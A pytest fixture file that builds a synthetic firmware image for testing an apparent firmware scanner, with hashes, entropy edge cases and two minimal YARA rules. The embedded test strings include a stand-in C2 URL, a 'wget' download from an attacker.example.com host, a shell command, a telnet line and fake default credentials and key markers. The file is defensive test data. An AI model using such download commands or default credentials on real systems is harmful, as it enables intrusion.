"""Shared pytest fixtures generating deterministic synthetic firmware."""
from __future__ import annotations

import hashlib
import random
from pathlib import Path

import pytest


@pytest.fixture(scope="session")
def synthetic_firmware_bytes() -> bytes:
    """Build a reproducible synthetic binary with known structure.

    Offset  Size    Content
    ──────  ──────  ──────────────────────────────────────────────
    0       8       PNG magic bytes
    8       16      ELF header fragment (32-bit LE)
    24      16      Zero padding
    40      2048    Seeded pseudo-random high-entropy block
    2088    16      Zero separator
    2104    ~450    Plaintext strings with known categories
    ~2554   512     0xFF low-entropy padding
    """
    parts: list[bytes] = []

    # PNG magic
    parts.append(b'\x89PNG\r\n\x1a\n')

    # ELF 32-bit LE header fragment
    parts.append(b'\x7fELF\x01\x01\x01\x00' + b'\x00' * 8)

    # Zero padding
    parts.append(b'\x00' * 16)

    # High-entropy block using seeded RNG for reproducibility
    rng = random.Random(0xDEADBEEF)
    high_entropy = bytes(rng.getrandbits(8) for _ in range(2048))
    parts.append(high_entropy)

    # Zero separator
    parts.append(b'\x00' * 16)

    # Known-category strings (each null-terminated)
    parts.append(b'http://malicious-c2.example.com/callback\x00')
    parts.append(b'password=admin123\x00')
    parts.append(b'secret=mys3cr3tkey\x00')
    parts.append(b'-----BEGIN RSA PRIVATE KEY-----\x00')
    parts.append(b'AKIAIOSFODNN7EXAMPLE\x00')      # 20 chars: AKIA + 16
    parts.append(b'TODO: remove backdoor before release\x00')
    parts.append(b'wget http://attacker.example.com/payload.sh\x00')
    parts.append(b'bash -c "echo pwned"\x00')
    parts.append(b'192.168.1.100\x00')
    parts.append(b'telnet 0.0.0.0 23\x00')
    parts.append(b'admin:admin\x00')

    # Low-entropy 0xFF padding
    parts.append(b'\xff' * 512)

    return b''.join(parts)


@pytest.fixture(scope="session")
def synthetic_firmware_file(tmp_path_factory, synthetic_firmware_bytes) -> Path:
    tmp = tmp_path_factory.mktemp("firmware")
    fw_path = tmp / "test_firmware.bin"
    fw_path.write_bytes(synthetic_firmware_bytes)
    return fw_path


@pytest.fixture(scope="session")
def known_hashes(synthetic_firmware_bytes) -> dict:
    """Pre-computed hashes for the synthetic firmware."""
    return {
        "md5":    hashlib.md5(synthetic_firmware_bytes).hexdigest(),
        "sha1":   hashlib.sha1(synthetic_firmware_bytes).hexdigest(),
        "sha256": hashlib.sha256(synthetic_firmware_bytes).hexdigest(),
    }


@pytest.fixture(scope="session")
def all_zero_file(tmp_path_factory) -> Path:
    """512 bytes of 0x00 — minimum entropy (0.0)."""
    tmp = tmp_path_factory.mktemp("edge")
    p = tmp / "zeros.bin"
    p.write_bytes(b'\x00' * 512)
    return p


@pytest.fixture(scope="session")
def uniform_file(tmp_path_factory) -> Path:
    """All 256 byte values each appearing 8 times — near-maximum entropy."""
    tmp = tmp_path_factory.mktemp("edge")
    p = tmp / "uniform.bin"
    p.write_bytes(bytes(range(256)) * 8)
    return p


@pytest.fixture(scope="session")
def minimal_yara_rules_file(tmp_path_factory) -> Path:
    """Minimal YARA rules that match the synthetic firmware."""
    tmp = tmp_path_factory.mktemp("rules")
    rules_path = tmp / "test_rules.yar"
    rules_path.write_text('''\
rule TestAdminCredential
{
    meta:
        description = "Test rule: admin:admin credential"
        severity    = "high"
    strings:
        $s = "admin:admin"
    condition:
        $s
}

rule TestRSAKey
{
    meta:
        description = "Test rule: embedded RSA private key"
        severity    = "critical"
    strings:
        $s = "-----BEGIN RSA PRIVATE KEY-----"
    condition:
        $s
}
''', encoding="utf-8")
    return rules_path
